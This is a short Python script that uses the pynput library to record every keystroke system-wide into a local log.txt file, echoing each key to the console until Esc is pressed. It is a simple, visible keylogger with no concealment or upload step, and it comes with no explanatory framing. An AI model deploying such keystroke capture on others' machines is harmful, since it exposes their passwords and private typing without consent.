import pynput
from pynput.keyboard import Key, Listener

def write_file(char):
    with open('log.txt', 'a') as f:
        f.write(char)

def on_press(key):
    try:
        # Log alphanumeric characters directly
        if key.char is not None:
            write_file(key.char)
            print(f'Alphanumeric key {key.char} pressed')
    except AttributeError:
        # Handle special keys separately
        if key == Key.space:
            write_file(' ')  # Add a space character
        elif key == Key.enter:
            write_file('\n')  # Add a new line
        elif key == Key.tab:
            write_file('\t')  # Add a tab character
        elif key == Key.backspace:
            write_file('[BACKSPACE]')  # Indicate backspace
        else:
            write_file(f'[{str(key)}]')  # Other special keys
        print(f'Special key {key} pressed')

def on_release(key):
    print(f'{key} released')
    if key == Key.esc:
        return False  # Stop the listener

# Start listening to keyboard events
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
